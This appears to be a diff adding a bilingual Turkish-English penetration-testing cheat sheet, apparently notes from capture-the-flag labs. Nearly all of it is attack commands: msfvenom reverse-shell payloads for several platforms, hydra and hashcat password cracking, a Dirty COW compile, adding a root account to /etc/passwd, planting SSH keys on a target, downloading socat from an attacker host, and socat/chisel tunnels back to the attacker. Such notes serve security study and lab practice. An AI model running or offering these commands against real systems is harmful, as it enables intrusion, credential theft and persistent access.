@@ -1,0 +1,247 @@
+--MSFVENOM--
+
+msfvenom -p payload LHOST=host LPORT=port(at local) -f exe > shell.exe
+
+Linux yürütülen ve bağlanabilen(elf) => (Linux executable and connectable elf file)
+msfvenom -p linux/x86/meterpreter/reverse_tcp LSHOT=... LPORT=... -f elf > rev_shell.elf
+
+for Windows
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=... LPORT=... -f exe > rev_shell.exe
+
+for PHP
+msfvenom -p php/meterpreter_reverse_tcp LHOST=... LPORT=... -f raw > rev_shell.php
+
+for ASP
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=... LPORT=... -f asp > rev_shell.asp
+
+for Python
+msfvenom  -p cmd/unix/reverse_python LHOST=... LPORT=... -f raw > raw_shell.py
+
+--GPG--
+gpg --import private.key
+gpg --decrypt fragment.asc
+
+--HASCAT--
+hashcat -m 400 -a 0 -o hashed.txt hash /usr/share/wordlists/rockyoyu.txt
+hashcat -m 0 -a 0 hash.txt /home/kali/Desktop/wordlist.txt --force
+hashcat -a 3 -m 0 hash.txt ?d?d?d?d?d?d?d?d?d --force=>9 tane rakamdan oluşan karakter seti döner.
+
+hash-identifier=> hash information tool.
+hashid+"hashtext"= result
+hashcat -m 0 dosya.txt rockyou.txt
+
+--GCC--
+gcc -pthread dirty.c -o dirty -lcrypt
+./dirty
+
+--JOHNTHERIPPER & ZIP2JOHN & SSH2JOHN--
+zip2john archive.zip > haszip.txt
+ls
+john haszip.txt--> bigboobz
+unzip archive.zip = michael
+
+./ssh2john.py michael > michael.hash
+john michael.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt michael.hash
+
+python ssh2john.py id_rsa > id_rsa.bash
+ls
+john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.bash
+
+--HYDRA--
+-l kullanıcı adı => (username)
+-P password dosyası => (password file)
+-s hangi portlar için kullanılacak(22) => (which port)
+-t daha hızlı (fast)
+-v daha detaylı (verbose)
+-vV (very verbose)
+hydra -l johnny -P words.txt -v ipadress ssh -s portno -t 4
+
+hydra -l sysadmin -P /root/Desktop/KB1/Kb.txt $target_ip  -t  4 ssh
+
+hydra -l sysadmin -P /usr/share/wordlists/rockyou.txt $target_ip ssh
+
+hydra -l thomas -P /root/Desktop/ALFA/wordlist.txt $target_ip -t 4 ssh -s 65111
+
+hydra -l fog -P /root/Desktop/F0G/dict.txt $target_ip -t 4 ftp
+
+hydra -l johnny -P words.txt -V $target_ip ssh -s portno -t 4 => -V verbose -s port -t speed
+
+hydra -l mileydyson -P /root/log1.txt $target_ip http-get-form “/squirrel/login.php:username=mileydyson&password=^PASS^:Invalid Password!"
+
+hydra -l “username” -p “password" ssh://ip -Vf
+
+hydra -L users.txt -t 5 -e nsr $ip ssh
+
+--GOBUSTER--
+gobuster dir -u $target_ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.js,.html
+
+dirb http://url/directory/ (Simple Test)
+
+gobuster vhost $target_ip -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -x .php,.txt,.js,.html => sub hostları bulur. => (find sub hosts"vhost")
+
+gobuster dir -u $target_ip -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -s 200,204,301,302,401
+
+/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+
+
+gobuster dir -u http://$target_ip/admin/ -w /home/kali/Desktop/directory-list-2.3-medium.txt -x .htm,.html,.txt,.php,.js,.bak,.tar,.jar,.rar,.zip
+
+--CRUNCH--
+crunch 8 8 -t creed%%% -o ftpwordlist.txt-->crunch ile şifre oluşturduk. (created a password with crunch)
+@@@  => küçük harf => (lower case)
+,,,  => büyük harf için bu. => (upper case)
+^^^  => özel işaret için bunu kullancaz. => (special characters)
+
+crunch 7 7 -t milo%%% -o wordlist.txt
+crunch 8 8 asdfmni -o wordlist.txt
+
+--CEWL--
+sitedeki kelimelerden cewl aracıyla bir wordlist.txt oluşturmaK (make a wordlist.txt with cewl from words on target website)
+
+cewl -w words.txt -d 1 -m 5 http://ipadres/johnnyrambo/
+-w /root/Desktop/first.txt olarak değiştir. (try this file too)
+cd root/Desktop/
+cat first blood.txt
+-w çıkış (output)
+-d derinlik (depth)
+-m minimum uzunluk. (min-length)
+
+cewl $ip:8080 -w /root/Desktop/CewlKid.txt -d 1 -m 5 http://ipadres/johnnyrambo/
+
+cewl $ip -w /root/Desktop/KB1/Kb.txt ile safyadaki kelimelerle wordlist yaptık. (created a wordlist)
+
+cewl -w words.txt -d 1(depth) -m5(length) $ipadress
+
+--FCRACKZIP--
+fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' website.zip
+fcrackzip -u D -p /usr/share/wordlists/rockyou.txt  secretsteg.zip
+
+--WFUZZ--
+wfuzz -c -w /root/Desktop/F0G/dict.txt -d "username=fog&password=FUZZ" --hw 200 + URL
+ 
+WFUZZ İLE PARAMETRE BULMAK(Find parameter with wfuzz)
+
+wfuzz -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -c -t 40 "http://192.168.206.80/console/file.php?FUZZ=/etc/passwd"
+--hc 0 da kullanılabilir. ("--hc 0" can be use too)
+
+--OPENSSL--
+nano passwd
+password dosyasını editleyerek root olarak login olabiliyoruz.
+openssl passwd -1 -salt mrersec mrersec123 => (create a user-password for passwd file)
+nano /etc/passwd & ctrl+ v
+su mrersec
+password mrersec123 => Login successfull
+
+openssl rsa -in michael -out id_rsa
+pw :mypassword1234
+chmod 700 id_rsa
+ssh -t michael@$ip -i id_rsa
+Login successfull
+
+openssl rsa -in id_rsa -out id_rsa_enc
+openssl rsa -in michael -out id_rsa
+chmod 700 id_rsa
+ssh -t michael@ip -i id_rsa
+
+--------/etc/passwd yapısı-------- => (/etc/passwd structure)
+test:x:0:0:root:/root:/bin/bash
+test=kullanıcı adı => (username)
+x=şifre => (password)
+0=uid 
+0=guid
+/root=kullanıcı kimliği bilgisi => (user credential information)
+/bin/bash=shell
+
+--MKPASSWD--
+mkpasswd -m sha-512 newpasswordhere (add password to shadow)
+openssl passwd newpasswordhere (add password to passwd)
+
+--SQLMAP--
+sqlmap -r req.txt --dump --batch -p parameter
+
+sqlmap -u(url)sitename --dbs --batch(default settings working)
+dbs silinip -D database adı yazılır yanına --tables .. devam eder -T tabloadı --cloumns parametresi ile kolon adı öğrenilir(change --dbs parameter and write -D,-T,-C)
+-C kolon adı yazılır en sonunda --dump (-C column dump parameter)
+
+--UNSHADOW--
+unshadow passwd.txt shadow.txt > passwords.txt
+
+--SSH-KEYGEN--
+LOKALDE(at local)
+ssh-keygen -t rsa
+kibarsa -->dosya adı => (filename)
+kibarsa ve kibarsa pub oluşur => (create kibarsa and kibarsa.pub)
+
+HEDEFTE(at target)
+mkdir .ssh
+cd .ssh
+echo ‘kibarsa.pub paste’ >authorized_keys
+
+LOKALDEN
+chmod 600 kibarsa
+ssh -i kibarsa kiba@ip -->yes-->login
+
+--BASE-64-DECODE--
+echo "codehere" | base64 -d
+
+--CURL--
+DOSYA İNDİRMEK(download file)
+sudo python3 -m http.server 80
+curl ATTACKINGIP/socat -o /tmp/socat-USERNAME &&
+chmod +x /tmp/socat-USERNAME
+
+curl -v ip=>durum kodu vs bakılır ( look at status code blabla)
+
+--FFUF--
+ffuf -w /usr/share/wordlists/dirb/common.txt -X POST -u http://$target_ip/api/items?FUZZ=dsadasdasd -fs45 -mc all =>cmd gibi parametreleri bulur. (find cmd like parameters)
+
+CURL İLE -fs değerini bulma (find -fs value with curl)
+curl -X POST http://$target_ip/api/items?asdasd=asdasdasd | wc -c
+
+--RUSTSCAN--
+rustscan -a ip -- -A --ulimit 5000
+
+--SOCAT--
+===SOCAT BAĞLANTILARI YENİDEN YÖNLENDİRMEK İÇİN KULLANILIR.=== (USED TO REDIRECT LINKS)
+HEDEFTE AÇILIR DİNLEMEYE ALINIR (USE ON TARGET AND LISTEN)
+./socat tcp-l:8000 tcp:ATTACKIP:443&
+./socat tcp-l:33060,fork,reuseaddr tcp:$ip:3306&
+./socat tcp:ATTACKIP:8001 tcp:TARGETIP:TARGETPORT,fork&
+./socat tcp-l:8000 tcp:$ip:433
+./socat tcp-l:2222,fork,useaddr tcp:$ip:22&
+
+--CHISEL--
+SSH GEREKMEZ SSH FORWARDİNG TUNNELLİNG İÇİN KULLANILIR
+2 MAKİNADA DA OLMALIDIR.
+scp -i id_rsa chisel user@target:/tmp/chisel-USERNAME =>DOSYA AKTARIMI (file transfer)
+chisel client | server --help
+./chisel server -p 4242 --reverse&
+./chisel client $ip1:4242 R:socks5&
+./chisel client $ip1:1337 R:$ip2:3306&
+./chisel client $ip1:4444 R:$ip2:80&
+
+--SHUTTLE--
+sshuttle -r pwned@$ip1 $ip2/16
+--ssh-cmd “ssh -i priv_key”
+-x $ip
+shuttle -r root@$ip4 --ssh-cmd “ssh -i id_rsa” $ip5/24 -x $ip4
+
+--STEGANOGRAPHY--
+steghide extract -sf milo.jpg => (steganography)
+binwalk -e imageadı.jpg
+wav=>sonic_visualizer=>gizlenen mesaj => (secret message)"spektogram"
+jpg dosyasını mousepad ile aç bak => (open jpg files with mousepad)
+strings dosya.jpg => (look malicious or secret messages)
+exiftool dosya.jpg => metadata
+stegcracker=>jpeg şifresi varsa kırılır.=>stegcracker dosya.jpg /home/kali/Desktop/rockyou.txt
+ZSTEG=>(bmp,png)=>gem install zsteg=>zsteg dosyaadı.png
+stegoveritas-->görüntü formatlarını inceler.-->stegoveritas dosya.jpeg (image format)
+COAGULA=>ses dosyasına görüntü gizler. (secret picture message in sound file)
+STEGSOLVE=>Dosya netleşir.QR kodu örnek sitedende bak. 
+STEGSEEK=>jpgyi açar.=>stegseek dosyaresim.jpg=>cat dosyaresim.jpg.out=>içine bakılır. (opening jpg files and cat picture.jpg.out)
+java resim tarama=> java -jar stegsolve.jar-->çalışır (java picture scan)
+
+--PROXYCHAINS--
+mousepad /etc/proxychains.conf açıp içine socks5 127.0.0.1 1080 eklememiz gerekir. (add socks5 127.0.0.1 in proxychains.conf)
+proxychains4 nmap -p80,8080 $ip/24 => subnetmaskları tarar (alt alan ağlarını) => (scanning subnetmasks)
